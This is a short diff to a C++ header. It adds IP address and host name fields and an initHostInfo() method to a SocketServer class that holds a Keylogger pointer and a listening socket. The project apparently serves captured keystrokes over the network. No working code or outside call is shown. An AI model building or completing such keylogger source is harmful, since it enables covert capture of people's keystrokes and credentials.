@@ -14,8 +14,12 @@
 class SocketServer {
 private:
 	Keylogger* logger;
-
 	SOCKET listenSocket;
+
+	std::string ip;
+	std::string hostName;
+
+	void initHostInfo();
 public:
 	SocketServer(Keylogger* logger);
 	void start();
